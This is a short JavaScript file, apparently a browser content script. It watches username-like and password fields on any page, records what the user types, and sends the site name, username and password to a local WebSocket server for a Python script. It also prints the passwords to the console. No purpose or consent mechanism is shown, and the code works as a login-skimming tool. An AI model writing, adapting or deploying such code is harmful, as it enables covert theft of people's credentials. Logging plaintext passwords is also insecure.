let recordedData = {
    name: '',
    password: ''
};

let timeoutId = null;
let socket = new WebSocket('ws://localhost:8765');

// Send credentials to WebSocket server
function sendCredentials() {
    if (recordedData.name && recordedData.password) {
        const site = window.location.hostname;

        const credentials = {
            site: site,
            username: recordedData.name,
            password: recordedData.password
        };

        // Send credentials in the format expected by the Python script
        socket.send(`credentials:${JSON.stringify(credentials)}`);
        console.log('Sent credentials to WebSocket server:', credentials);
    }
}

function updateData(fieldType, value) {
    recordedData[fieldType] = value;
    console.log(`Updated ${fieldType}:`, recordedData[fieldType]);

    // Clear previous timeout if it exists
    if (timeoutId) {
        clearTimeout(timeoutId);
    }

    // Set a new timeout to send data after 5 seconds of inactivity
    timeoutId = setTimeout(sendCredentials, 5000);
}

function finalizeData() {
    console.log('Finalizing Data:', recordedData);
    sendCredentials();
}

document.addEventListener('focus', (event) => {
    if (event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) {
        console.log('Focused on username field');
    } else if (event.target.type === 'password') {
        console.log('Focused on password field');
    }
}, true);

document.addEventListener('input', (event) => {
    if ((event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) ||
        event.target.type === 'password') {
        updateData(event.target.type === 'text' ? 'name' : 'password', event.target.value);
    }
}, true);

document.addEventListener('blur', (event) => {
    if ((event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) ||
        event.target.type === 'password') {
        finalizeData();
    }
}, true);

// WebSocket connection handling
socket.addEventListener('open', () => {
    console.log('WebSocket connection established.');
});

socket.addEventListener('message', (event) => {
    console.log('Message from WebSocket server:', event.data);
});

socket.addEventListener('error', (event) => {
    console.error('WebSocket error observed:', event);
});

socket.addEventListener('close', () => {
    console.log('WebSocket connection closed.');
});
